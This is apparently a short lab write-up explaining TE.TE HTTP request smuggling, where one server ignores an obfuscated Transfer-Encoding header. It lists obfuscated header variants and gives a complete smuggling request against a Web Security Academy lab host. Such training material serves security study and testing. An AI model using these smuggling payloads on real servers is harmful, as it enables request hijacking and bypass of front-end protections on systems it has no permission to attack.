## TE.TE vulnerabilities (obfuscating TE header)

The front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating the header in some way.

Some obfuscation examples:
```http
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

To uncover a TE.TE vulnerability, it is necessary to find some variation of the `Transfer-Encoding` header such that only one of the front-end or back-end servers processes it, while the other server ignores it.

```http
POST / HTTP/1.1
Host: 0a6a008e033bed808147e98200020068.web-security-academy.net
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-length: 4
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: foo

a1
GPOST / HTTP/1.1
Host: 0a6a008e033bed808147e98200020068.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 15

foo=bar
0


```
